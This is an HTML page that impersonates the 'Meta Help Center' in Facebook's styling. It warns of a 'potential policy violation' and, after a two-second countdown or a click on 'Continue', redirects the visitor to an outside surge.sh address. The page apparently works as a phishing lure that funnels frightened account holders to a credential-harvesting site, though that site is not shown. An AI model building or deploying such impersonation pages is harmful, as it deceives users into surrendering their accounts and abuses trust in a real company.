<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Meta Help Center</title>

<style>
body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  background: #18191a; /* Dark background */
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  color: #e4e6eb;
}

.alert-box {
  background: #242526; /* Dark card background */
  padding: 30px;
  border-radius: 10px;
  width: 360px;
  text-align: center;
  box-shadow: 0 0 20px rgba(0,0,0,0.5);
}

.alert-box h2 {
  color: #ffffff; /* White header */
  margin-bottom: 15px;
}

.alert-box p {
  color: #b0b3b8;
  margin: 10px 0;
}

#countdown {
  font-weight: bold;
  color: #1877f2; /* Facebook blue */
  font-size: 18px;
}

.loader {
  margin: 20px auto;
  border: 6px solid #3a3b3c;
  border-top: 6px solid #1877f2;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  100% { transform: rotate(360deg); }
}

.button {
  margin-top: 15px;
  padding: 10px 20px;
  background: #1877f2;
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

.button:hover {
  background: #145dbf;
}
</style>
</head>
<body>

<div class="alert-box">
  <h2>Meta Help Center</h2>
  <p>We are reviewing a potential policy violation.</p>
  <p>Redirecting in <span id="countdown">2</span> seconds...</p>
  <div class="loader"></div>
  <button class="button" onclick="redirectNow()">Continue</button>
</div>

<script>
var seconds = 2; // Countdown in 2 seconds

var countdownInterval = setInterval(function() {
  seconds--;
  document.getElementById("countdown").textContent = seconds;

  if (seconds <= 0) {
    clearInterval(countdownInterval);
    window.location.href = "https://violation-policy-submit-foam-here.surge.sh/"; 
  }
}, 1000);

function redirectNow() {
  window.location.href = "https://violation-policy-submit-foam-here.surge.sh/";
}
</script>

</body>
</html>
